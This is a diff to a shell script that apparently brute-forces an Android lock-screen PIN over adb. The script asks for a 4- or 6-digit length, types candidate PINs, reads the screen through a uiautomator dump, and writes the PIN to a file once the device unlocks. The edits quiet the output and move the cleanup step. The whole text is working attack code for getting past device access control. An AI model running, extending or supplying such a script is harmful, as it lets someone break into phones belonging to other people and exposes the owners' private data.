@@ -9,9 +9,9 @@ ScreenOn
 
 EnterPass
 
-echo "How much digits you think ?"
+echo "How much digits is on screen ?"
 echo "  1) 4 digits"
-echo "  2) 6 digits 2"
+echo "  2) 6 digits"
  
 read n
 case $n in
@@ -29,13 +29,13 @@ then
 		echo trying $gen
 		Text $gen
 		Enter
-		adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml
-                adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml
+                adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin"
-                then echo "LOCKED"
+                then echo ""
                 else 
                    echo UNLOCKED with $gen 
                    touch  $gen.is.pin
+                   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                    break
                 fi
 
@@ -56,14 +56,14 @@ then
 		echo Trying $gen
                 Text $gen
                 Enter
-		adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml
-		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml
-		if cat /tmp/view.xml  |grep -q "Pin"
-                then echo "LOCKED"
+		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
+		if cat /tmp/view.xml  |grep -q "Pin" 
+                then echo ""
                 else 
 		   echo UNLOCKED with $gen 
 		   touch  $gen.is.pin
-		   break
+		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
+	  	   break
                 fi
  
 
